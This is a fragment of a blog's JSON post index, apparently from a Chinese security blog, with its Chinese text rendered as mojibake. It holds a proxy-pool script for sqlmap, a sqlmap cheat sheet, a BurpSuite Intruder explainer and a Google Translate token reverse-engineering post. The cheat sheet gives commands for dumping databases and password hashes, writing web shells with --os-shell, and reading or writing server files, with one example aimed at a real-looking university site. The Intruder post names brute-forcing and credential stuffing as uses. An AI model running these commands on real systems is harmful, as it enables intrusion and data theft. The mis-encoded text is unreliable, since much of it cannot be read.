mbsocket.recv(1024) if not data_1: break print('[*' + localtime + ']: Send data...') client.send(data_1) except socket.timeout as e: print(proxyip) print(\"[-]Back to the client : \" + str(e)) continue # å…³é—­è¿æ¥ client.close() mbsocket.close()def Loadips(): print(\"[*]Loading proxy ips..\") ip_list = [] ip = ['ip', 'port'] with open(\"ips.txt\") as ips: lines = ips.readlines() for line in lines: ip[0], ip[1] = line.strip().split(\":\") ip[1] = eval(ip[1]) nip = tuple(ip) ip_list.append(nip) return ip_listdef main(): print('''*Atuhor : V@1n3R.*Blog :http://www.Lz1y.cn*date: 2017.7.17*http://www.Lz1y.cn/wordpress/?p=643 __ __ _ _____ ____ \\ \\ / /_ _/ |_ __ |___ /| _ \\ \\ \\ / / _` | | '_ \\ |_ \\| |_) | \\ V / (_| | | | | |___) | _ &lt; _ \\_/ \\__,_|_|_| |_|____/|_| \\_(_) ''') ip_list = Loadips() # ip_list = [('118.89.148.92',8088)] # ip_list = tuple(ip_list) try: pst = ProxyServerTest(ip_list) # å¤šçº¿ç¨‹ t = threading.Thread(target=pst.run, name='LoopThread') print('[*]Waiting for connection...') # å…³é—­å¤šçº¿ç¨‹ t.start() t.join() except Exception as e: print(\"[-]main : \" + str(e)) return \"[-]main : \" + str(e)if __name__ == '__main__': main() SqlMapä½¿ç”¨ä»£ç†æ±  sqlmapåŠ ä¸Šä»£ç† â€œâ€“proxy=http://127.0.0.1:9999â€ å³å¯ä½¿ç”¨ ä½¿ç”¨ä¹‹å‰å»ºè®®å…ˆæ£€æµ‹ä¸€ä¸‹ä»£ç†çš„æœ‰æ•ˆæ€§ï¼šhttp://h.jiguangdaili.com/check/","categories":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"}]},{"title":"SqlMapæ€»ç»“","slug":"SqlMapæ€»ç»“","date":"2020-06-22T03:29:58.000Z","updated":"2020-06-22T05:41:42.962Z","comments":true,"path":"2020/06/22/SqlMapæ€»ç»“/","link":"","permalink":"http://yoursite.com/2020/06/22/SqlMap%E6%80%BB%E7%BB%93/","excerpt":"","text":"SqlMapæµ‹è¯•åŸºæœ¬æµç¨‹ sqlmap -u â€œurlâ€ sqlmap -u URL â€“dbs sqlmap -u URL -D database â€“tables sqlmap -u URL -D database -T tablename â€“columns sqlmap -u URL -D database -T tablename -C columnsname â€“dump SqlMapå¸¸ç”¨å‘½ä»¤ 1234567891011121314151617181920212223--is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼Œmssqlä¸‹æœ€é«˜æƒé™ä¸ºsaï¼‰-â€“batch é»˜è®¤é€‰é¡¹è¿è¡Œ--dbs æ‰€æœ‰æ•°æ®åº“--current-db ç½‘ç«™å½“å‰æ•°æ®åº“--users æ‰€æœ‰æ•°æ®åº“ç”¨æˆ·--current-user å½“å‰æ•°æ®åº“ç”¨æˆ·--random-agent æ„é€ éšæœºuser-agentâ€“dbms æŒ‡å®šåç«¯æ•°æ®åº“,ç»™å®šåç«¯æ•°æ®åº“çš„ç±»å‹å¯ä»¥å‡å°‘å‡å°‘æ— å…³çš„æµ‹è¯•ç”¨ä¾‹--proxy http:&#x2F;&#x2F;local:8080 â€“threads 10 (å¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹åŠ é€Ÿ) ä»£ç†--time-sec&#x3D;TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’--threads&#x3D; ä½¿ç”¨å¤šå°‘çº¿ç¨‹â€“fresh-queries fresh-queriesä¼šå¿½ç•¥ä¹‹å‰çš„æŸ¥è¯¢ç»“æœ,è¿›è¡Œé‡æ–°è¯·æ±‚æ“ä½œâ€“flush-session flush-sessionä¼šæ¸…ç©ºå½“å‰URLç›¸å…³çš„sessionâ€“level è®¾ç½®æ£€æµ‹çš„æ–¹æ–¹é¢é¢å’Œæµ‹è¯•ç”¨ä¾‹ - é»˜è®¤æ˜¯1,ä¼šå°è¯•POSTå’ŒGET - 2:Cookieä¹Ÿä¼šåŠ å…¥æ£€æµ‹ - 3:User-Agentå’ŒRefererä¹Ÿä¼šæ£€æµ‹, æ›´å¤§çš„å€¼ä¼šå¢åŠ ç”¨ä¾‹é‡-â€“technique æŒ‡å®šsqlmapä½¿ç”¨çš„æ£€æµ‹æŠ€æœ¯ B:Boolean-based-blind ï¼ˆå¸ƒå°”å‹æ³¨å…¥ï¼‰ U:Union query-based ï¼ˆè”åˆæ³¨å…¥ï¼‰ E:Error-based ï¼ˆæŠ¥é”™å‹æ³¨å…¥) S:Starked queries ï¼ˆé€šè¿‡sqlmapè¯»å–æ–‡ä»¶ç³»ç»Ÿã€æ“ä½œç³»ç»Ÿã€æ³¨å†Œè¡¨å¿…é¡» ä½¿ç”¨è¯¥å‚æ•°ï¼Œå¯å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥ï¼‰ T:Time-based blind ï¼ˆåŸºäºæ—¶é—´å»¶è¿Ÿæ³¨å…¥ï¼‰ MYSQLæ–°ç‰¹æ€§secure_file_privå¯¹è¯»å†™æ–‡ä»¶çš„å½±å“ secure-file-privæ˜¯åœ¨Mysql5.7ç‰ˆæœ¬åå¼•å…¥çš„æ–°ç‰¹æ€§ï¼Œsecure-file-privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶å¯¼å…¥å¯¼å‡ºä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½• å½“é…ç½®æ–‡ä»¶å†…æ²¡æœ‰secure-file-privå‚æ•°ï¼Œè¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º å½“secure_file_privçš„å€¼æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œè¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶ å½“secure_file_privçš„å€¼ä¸º/tmp/ ï¼Œè¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨/tmp/ç›®å½•ä¸‹ è§£å†³æ–¹æ³•ï¼š windowsä¸‹ï¼šä¿®æ”¹my.ini åœ¨[mysqld]å†…åŠ å…¥secure_file_priv = linuxä¸‹ï¼šä¿®æ”¹my.cnf åœ¨[mysqld]å†…åŠ å…¥secure_file_priv = ä¹‹åéœ€é‡å¯Mysql SqlMapæŠ€å·§ æŠ“åŒ…æ³¨å…¥ ä»bpæŠ“åŒ…æ–‡ä»¶ä¸­æ£€æµ‹ 1sqlmap.py -r &quot;è·¯å¾„&quot; æŒ‡å®šæ£€æµ‹å‚æ•° -p å‚æ•°å å‚æ•°åé¢åŠ ä¸Š*d ä¼ªé™æ€æ³¨å…¥ 1.&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;sfl.fzu.edu.cn&#x2F;index.php&#x2F;Index&#x2F;view&#x2F;id&#x2F;40*.html&quot; éœ€è¦ç™»é™†çš„æ³¨å…¥ åˆ©ç”¨cookieå‚æ•°æ³¨å…¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æŠ“åŒ…æ³¨å…¥ï¼š 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp; Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; äº¤äº’å¼shell å†™æ–‡ä»¶çš„ä¸¤ä¸ªå‰æï¼š è·å–ç½‘ç«™çš„ç»å¯¹è·¯å¾„ æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™dba/root é¦–å…ˆåˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºdbaæƒé™ å¼€å§‹å†™å…¥shell 1sqlmap.py -r &quot;è·¯å¾„&quot; --os-shell é€‰æ‹©shellè„šæœ¬ç±»å‹ï¼Œæ¥ç€è¾“å…¥è·¯å¾„ï¼Œå†™å…¥æˆåŠŸå°±è¿›å…¥ä¸€ä¸ªäº¤äº’å¼çš„shellå‘½ä»¤è¡Œï¼Œè¿˜ä¼šè¿”å›ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯å†™å…¥äº†2ä¸ªshellï¼Œä¸€ä¸ªç”¨æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¦ä¸€ä¸ªç”¨æ¥ä¸Šä¼ ï¼Œå…¶ä¸­ä¸Šä¼ shellçš„æ–‡ä»¶åä¸ºtmpugppx.phpï¼Œå‡ºç°admin adminè¿™æ ·çš„æ–‡å­—ï¼Œè¿™æ˜¯sqlmapç”¨æ¥ç¡®è®¤æ˜¯å¦æˆåŠŸå†™è¿›shellçš„æ ‡å¿— æ–‡ä»¶è¯»å†™ è¯»æ–‡ä»¶éœ€è¦çŸ¥é“è·¯å¾„ 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-read&#x3D;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;php.ini å†™æ–‡ä»¶ 1sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxxxx&#x2F;sqli&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit&quot; --cookie&#x3D;&quot;PHPSESSID&#x3D;q3bm4gupu58dqptm0lve1o12u4; security&#x3D;low&quot; --file-write C:\\1.txt --file-dest &#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;vulnerabilities&#x2F;exec&#x2F;1.txt è¡¨ç¤ºå°†æœ¬åœ°C:\\\\1.txt å†™å…¥åˆ°æœåŠ¡å™¨ç«¯/opt/lampp/htdocs/vulnerabilities/exec/1.txt è¾…åŠ©æ‰‹å·¥æ³¨å…¥ ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯æ¯æ‰§è¡Œä¸€æ¬¡éƒ½ä¼šä½¿ç”¨æ‰‹å·¥çš„è¯­å¥æ³¨å…¥ä¸€éï¼Œæ•ˆç‡æ¯”è¾ƒä½ï¼Œç¬¬äºŒç§ç±»ä¼¼äºå¹³å¸¸å‘½ä»¤è¡Œæ‰§è¡Œsqlè¯­å¥ 12sqlmap.py -r &quot;è·¯å¾„&quot; --sql-query &quot;sqlè¯­å¥&quot;sqlmap.py -r &quot;è·¯å¾„&quot; --sql-shell SqlMapæ£€æµ‹å‚æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465--current-user æ£€ç´¢å½“å‰ç”¨æˆ·--current-db æ£€ç´¢å½“å‰æ•°æ®åº“-is-dba å½“å‰ç”¨æˆ·æƒé™ï¼ˆæ˜¯å¦ä¸ºrootæƒé™ï¼‰-dbs æ‰€æœ‰æ•°æ®åº“--users åˆ—å‡ºç”¨æˆ·åˆ—è¡¨--passwords åˆ—å‡ºç”¨æˆ·å¯†ç çš„hashå€¼--os-shell æç¤ºä¸ºäº¤äº’å¼æ“ä½œç³»ç»Ÿshell--os-pwn æç¤ºä¸ºOOBå¤–å£³ï¼ŒMeterpreteræˆ–VNC--batch æ°¸è¿œä¸è¦è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨é»˜è®¤è¡Œä¸º--sql-shell æç¤ºè¾“å…¥äº¤äº’å¼sqlmap shellè¯·æ±‚: è¿™äº›é€‰é¡¹å¯ç”¨äºæŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URL --data&#x3D;DATA æ•°æ®å­—ç¬¦ä¸²é€šè¿‡POSTå‘é€ --cookie&#x3D;COOKIE HTTP Cookieçš„å€¼ --random-agent éšæœºé€‰æ‹© HTTP User-Agent å¤´çš„å€¼ --proxy&#x3D;PROXY ä½¿ç”¨ä»£ç†å»è¿æ¥ç›®æ ‡URL --tor ä½¿ç”¨åŒ¿åç½‘ç»œ --check-tor æ£€æŸ¥Toræ˜¯å¦æ­£ç¡®ä½¿ç”¨File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚ â€“file-read&#x3D;RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶ â€“file-write&#x3D;WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶ â€“file-dest&#x3D;DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„Optimizationï¼ˆä¼˜åŒ–ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ–SqlMapçš„æ€§èƒ½ã€‚ -o å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³ â€“predict-output é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º â€“keep-alive ä½¿ç”¨æŒä¹…çš„HTTPï¼ˆSï¼‰è¿æ¥ â€“null-connection ä»æ²¡æœ‰å®é™…çš„HTTPå“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦ â€“threads&#x3D;THREADS æœ€å¤§çš„HTTPï¼ˆSï¼‰è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º1ï¼‰Injectionï¼ˆæ³¨å…¥ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œ æä¾›è‡ªå®šä¹‰çš„æ³¨å…¥payloadså’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚ -p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°ï¼ˆSï¼‰ â€“dbms&#x3D;DBMS å¼ºåˆ¶åç«¯çš„DBMSä¸ºæ­¤å€¼ â€“os&#x3D;OS å¼ºåˆ¶åç«¯çš„DBMSæ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼ â€“prefix&#x3D;PREFIX æ³¨å…¥payloadå­—ç¬¦ä¸²å‰ç¼€ â€“suffix&#x3D;SUFFIX æ³¨å…¥payloadå­—ç¬¦ä¸²åç¼€ â€“tamper&#x3D;TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ï¼ˆSï¼‰ç¯¡æ”¹æ³¨å…¥æ•°æ®Detectionï¼ˆæ£€æµ‹ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨SQLç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒHTTPå“åº”é¡µé¢çš„å†…å®¹ã€‚ â€“level&#x3D;LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º1ï¼‰ â€“risk&#x3D;RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º1ï¼‰ â€“string&#x3D;STRING æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸² â€“regexp&#x3D;REGEXP æŸ¥è¯¢æ—¶æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ â€“text-only ä»…åŸºäºåœ¨æ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µTechniquesï¼ˆæŠ€å·§ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„SQLæ³¨å…¥æµ‹è¯•ã€‚ â€“technique&#x3D;TECH SQLæ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤BEUSTï¼‰ â€“time-sec&#x3D;TIMESEC DBMSå“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º5ç§’ï¼‰ â€“union-cols&#x3D;UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯•UNIONæŸ¥è¯¢æ³¨å…¥ â€“union-char&#x3D;UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦Fingerprintï¼ˆæŒ‡çº¹ï¼‰ï¼š -f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„DBMSç‰ˆæœ¬æŒ‡çº¹Brute forceï¼ˆè›®åŠ›ï¼‰ï¼šè¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚ â€“common-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨ â€“common-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—","categories":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"}]},{"title":"BurpSuiteâ€”â€”Intruderå››ç§æ¨¡å¼è¯¦è§£","slug":"BurpSuiteâ€”â€”Intruderå››ç§æ¨¡å¼è¯¦è§£","date":"2020-06-17T14:57:52.000Z","updated":"2020-06-17T14:59:23.398Z","comments":true,"path":"2020/06/17/BurpSuiteâ€”â€”Intruderå››ç§æ¨¡å¼è¯¦è§£/","link":"","permalink":"http://yoursite.com/2020/06/17/BurpSuite%E2%80%94%E2%80%94Intruder%E5%9B%9B%E7%A7%8D%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"ä¸€ã€Sniperï¼ˆç‹™å‡»æ‰‹ï¼‰ Sniperæ¨¡å¼åªèƒ½ä½¿ç”¨ä¸€ç»„ payload é›†åˆï¼Œä¸€æ¬¡åªä½¿ç”¨ä¸€ä¸ª payload ä½ç½®ï¼›å‡å¦‚æ ‡è®°äº†ä¸¤ä¸ªä½ç½® â€œAâ€ å’Œ â€œBâ€ ï¼Œpayload é›†åˆå†…æœ‰â€œ1â€å’Œâ€œ2â€ä¸¤ä¸ªå€¼ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼šå½¢æˆä»¥ä¸‹ç»„åˆï¼š æ”»å‡»åºåˆ— ä½ç½®A ä½ç½®B 1 1 ä¸æ›¿æ¢ 2 2 ä¸æ›¿æ¢ 3 ä¸æ›¿æ¢ 1 4 ä¸æ›¿æ¢ 2 é€‚ç”¨åœºæ™¯ï¼šç«äº‰æ¡ä»¶æµ‹è¯•ï¼ˆé€‰æ‹©Null payloadsï¼‰ï¼Œå¯†ç ã€éªŒè¯ç æš´åŠ›ç ´è§£ï¼Œé‡æ”¾æ”»å‡»ç­‰åœºæ™¯ äºŒã€Battering ramï¼ˆæ”»åŸé”¤ï¼‰ åŒæ ·åªèƒ½ä½¿ç”¨ä¸€ç»„ payload é›†åˆï¼Œä¸åŒçš„åœ°æ–¹åœ¨äºæ¯æ¬¡æ”»å‡»éƒ½æ˜¯æ›¿æ¢æ‰€æœ‰payloadæ ‡è®°ä½ç½®ï¼›å¦‚æœæ·»åŠ äº†ä¸¤ä¸ªå‚æ•°çš„è¯ï¼Œå°±ä¸€èµ·è¿›è¡Œçˆ†ç ´ï¼Œä¸¤ä¸ªå‚æ•°çˆ†ç ´æ—¶å€™çš„å€¼è‚¯å®šå°±æ˜¯ä¸€æ ·çš„äº†ï¼š æ”»å‡»åºåˆ— ä½ç½®A ä½ç½®B 1 1 1 2 2 2 é€‚ç”¨åœºæ™¯ï¼šæš´åŠ›ç ´è§£ ä¸‰ã€Pitchforkï¼ˆè‰å‰ï¼‰ è‰å‰æ¨¡å¼å…è®¸ä½¿ç”¨å¤šç»„payloadç»„åˆï¼Œå¦‚æœåªæ·»åŠ äº†ä¸€ä¸ªå‚æ•°çš„è¯ï¼Œä¼šæŠ¥é”™ï¼›åœ¨æ¯ä¸ªæ ‡è®°ä½ç½®ä¸Šéå†å„è‡ªå¯¹åº”çš„payloadç»„åˆï¼Œå‡è®¾æœ‰ä¸¤ä¸ªä½ç½®â€œAâ€å’Œâ€œBâ€ï¼Œpayloadç»„åˆ1çš„å€¼ä¸ºâ€œ1â€å’Œâ€œ2â€ï¼Œpayloadç»„åˆ2çš„å€¼ä¸ºâ€œ3â€å’Œâ€œ4â€ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼šå½¢æˆä»¥ä¸‹ç»„åˆï¼š æ”»å‡»åºåˆ— ä½ç½®A ä½ç½®B 1 1 3 2 2 4 æ³¨ï¼šå¦‚æœä¸¤ä¸ªpayloadè¡Œæ•°ä¸ä¸€è‡´çš„è¯ï¼Œå–æœ€å°å€¼è¿›è¡Œæµ‹è¯•ã€‚æ‰€ä»¥çˆ†ç ´çš„æ¬¡æ•°å–ä¸¤ä¸ªä¸­æœ€å°çš„ä¸ºå‡†ã€‚ é€‚ç”¨åœºæ™¯ï¼šæ¶æ„æ³¨å†Œã€æ’è£¤ å››ã€Cluster bombï¼ˆé›†æŸç‚¸å¼¹ï¼‰ é›†æŸç‚¸å¼¹ä¹Ÿå…è®¸ä½¿ç”¨å¤šç»„payloadç»„åˆï¼Œè·Ÿè‰å‰æ¨¡å¼ä¸åŒçš„åœ°æ–¹åœ¨äºï¼Œé›†æŸç‚¸å¼¹æ¨¡å¼ä¼šå¯¹payloadç»„è¿›è¡Œç¬›å¡å°”ç§¯ï¼Œé‚£ä¹ˆå®ƒæ”»å‡»ä¼šå½¢æˆä»¥ä¸‹ç»„åˆï¼š æ”»å‡»åºåˆ— ä½ç½®A ä½ç½®B 1 1 3 2 1 4 1 2 3 2 2 4 é€‚ç”¨åœºæ™¯ï¼šè´¦å·ã€å¯†ç æš´åŠ›ç ´è§£","categories":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"BurpSuite","slug":"BurpSuite","permalink":"http://yoursite.com/tags/BurpSuite/"}]},{"title":"JSé€†å‘ç³»åˆ—ä¹‹è°·æ­Œç¿»è¯‘","slug":"JSé€†å‘ä¹‹è°·æ­Œç¿»è¯‘","date":"2020-06-17T10:16:58.000Z","updated":"2020-06-17T10:25:36.955Z","comments":true,"path":"2020/06/17/JSé€†å‘ä¹‹è°·æ­Œç¿»è¯‘/","link":"","permalink":"http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B9%8B%E8%B0%B7%E6%AD%8C%E7%BF%BB%E8%AF%91/","excerpt":"","text":"ä¸€ã€é€†å‘è°·æ­Œç¿»è¯‘ åˆ†æè¿‡ç¨‹ é¦–æ¬¡åˆ†æ é¦–å…ˆæ‰¾åˆ°è°·æ­Œç¿»è¯‘çš„Ajaxè¯·æ±‚æ¥å£ ä»¥getæ–¹å¼å‘é€çš„Ajaxè¯·æ±‚ï¼Œå¤šæ¬¡å°è¯•ï¼Œå‘ç°è¯·æ±‚å‚æ•°ä¸­ï¼Œtkå’Œqï¼Œæ˜¯ä¸æ–­å˜åŒ–çš„ï¼Œå…¶ä¸­qæ˜¯å¾…ç¿»è¯‘çš„å†…å®¹ï¼Œtkæ˜¯æ ¹æ®qè¿›è¡ŒjsåŠ å¯†ç®—æ³•ç”Ÿæˆçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†ætkçš„äº§ç”Ÿã€‚ é€šè¿‡æ–­ç‚¹é€†å‘tkçš„åŠ å¯†ç®—æ³• åŠ å¯†ç®—æ³•åº”è¯¥åœ¨translate_m_zh-CN.jsæ–‡ä»¶é‡Œ æ‰“ä¸ªæ–­ç‚¹ï¼Œè¯·æ±‚ç¿»è¯‘æ¥å£çš„URLæ—¶åœæ­¢ï¼Œå‘ç°åœ¨send(a)ä¸­åœæ­¢äº†ï¼Œæ ¹æ®Call Stackçš„è°ƒç”¨å…³ç³»ï¼Œä¸€æ­¥æ­¥åˆ†æï¼Œæœ€ä¸Šé¢çš„å°±æ˜¯sendå‡½æ•° ä¾æ¬¡å¾€ä¸‹ç‚¹å‡»æ¯ä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°ï¼Œå½“åˆ°äº†QEå‡½æ•°çš„æ—¶å€™ï¼Œå‘ç°äº†tkå‚æ•°æ¥è‡ªbï¼Œbåˆæ˜æ˜¾æ¥è‡ªc äºæ˜¯æˆ‘ä»¬é¡ºè—¤æ‘¸ç“œï¼Œå‘ç°cæ˜¯ç”±PE(d)äº§ç”Ÿçš„ï¼ŒPEåˆæ˜¯æ¥è‡ªpu(a)å‡½æ•°ï¼Œæˆ‘ä»¬è·³è½¬åˆ°puå‡½æ•°çš„ä½ç½®ï¼Œä¼¼ä¹å·²ç»æœ‰äº†ç­”æ¡ˆ åˆ†æç”Ÿæˆtkçš„JSä»£ç  å¦‚ä¸‹æ˜¯æˆ‘ä»¬åˆšè·å–çš„JSä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var mu = function(a) &#123; return function() &#123; return a &#125;&#125; , nu = function(a, b) &#123; for (var c = 0; c &lt; b.length - 2; c += 3) &#123; var d = b.charAt(c + 2); d = \"a\" &lt;= d ? d.charCodeAt(0) - 87 : Number(d); d = \"+\" == b.charAt(c + 1) ? a &gt;&gt;&gt; d : a &lt;&lt; d; a = \"+\" == b.charAt(c) ? a + d &amp; 4294967295 : a ^ d &#125; return a&#125; , ou = null , pu = function(a) &#123; if (null !== ou) var b = ou; else &#123; b = mu(String.fromCharCode(84)); var c = mu(String.fromCharCode(75)); b = [b(), b()]; b[1] = c(); b = (ou = window[b.join(c())] || \"\") || \"\" &#125; var d = mu(String.fromCharCode(116)); c = mu(String.fromCharCode(107)); d = [d(), d()]; d[1] = c(); c = \"&amp;\" + d.join(\"\") + \"=\"; d = b.split(\".\"); b = Number(d[0]) || 0; for (var e = [], f = 0, g = 0; g &lt; a.length; g++) &#123; var h = a.charCodeAt(g); 128 &gt; h ? e[f++] = h : (2048 &gt; h ? e[f++] = h &gt;&gt; 6 | 192 : (55296 == (h &amp; 64512) &amp;&amp; g + 1 &lt; a.length &amp;&amp; 56320 == (a.charCodeAt(g + 1) &amp; 64512) ? (h = 65536 + ((h &amp; 1023) &lt;&lt; 10) + (a.charCodeAt(++g) &amp; 1023), e[f++] = h &gt;&gt; 18 | 240, e[f++] = h &gt;&gt; 12 &amp; 63 | 128) : e[f++] = h &gt;&gt; 12 | 224, e[f++] = h &gt;&gt; 6 &amp; 63 | 128), e[f++] = h &amp; 63 | 128) &#125; a = b; for (f = 0; f &lt; e.length; f++) a += e[f], a = nu(a, \"+-a^+6\"); a = nu(a, \"+-3^+b+-f\"); a ^= Number(d[1]) || 0; 0 &gt; a &amp;&amp; (a = (a &amp; 2147483647) + 2147483648); a %= 1E6; return c + (a.toString() + \".\" + (a ^ b))&#125;; å‘ç°åšäº†å¾ˆå¤šä¸å¿…è¦çš„æ“ä½œã€ç”šè‡³å¤šæ­¤ä¸€ä¸¾ï¼Œç›®çš„æ˜¯ç”¨äºæ··æ·† å¦‚ï¼š 12345var mu &#x3D; function(a) &#123; return function() &#123; return a &#125;&#125; è¿˜ç”¨äº†.fromCharCode()å‡½æ•°ï¼ŒæŠŠæ•°å­—è½¬æ¢ä¸ºå­—æ¯ï¼Œæ˜æ˜¾å¤šæ­¤ä¸€ä¸¾çš„æ“ä½œã€‚ä½†æ˜¯ï¼Œé€šè¿‡åˆ†æï¼Œå‘ç°tkç”Ÿæˆéœ€è¦å¦ä¸€æ ·ä¸œè¥¿ï¼Œå°±æ˜¯tkkè¿™ä¸ªå‚æ•°ï¼Œæ¥æºäºç½‘é¡µæºä»£ç ä¸Šï¼Œå¯»æ‰¾ä¸€ç•ªï¼Œè¿˜æ˜¯å‘ç°äº†ï¼Œå¤šæ¬¡å°è¯•ï¼Œå‘ç°è¿™ä¸ªå€¼æ˜¯å›ºå®šçš„ å…·ä½“å®ç° è¯´æ˜ï¼šjsæ–‡ä»¶åšäº†ç²¾ç‚¼ï¼ŒæŠŠä¸å¿…è¦çš„å€¼å»æ‰äº†ï¼Œå®è¡Œçš„æ•ˆæœæ˜¯è‹±è¯‘ä¸­ï¼Œä¸åŒè¯­è¨€çš„ç¿»è¯‘ä¿®æ”¹è¯·æ±‚çš„å‚æ•°å³å¯ Pythonè„šæœ¬ 1234567891011121314151617181920212223242526import requestsimport jsonimport execjsdef get_tk(q): with open('google_tk.js', 'r', encoding='utf-8') as f: js = f.read() j = execjs.compile(js) tk = j.call('pu', q) return tkdef translate_google(): q = input(\"è¯·è¾“å…¥ä½ è¦ç¿»è¯‘çš„å†…å®¹ï¼š\") headers = &#123; \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\", \"referer\": \"https://translate.google.cn/\" &#125; url = 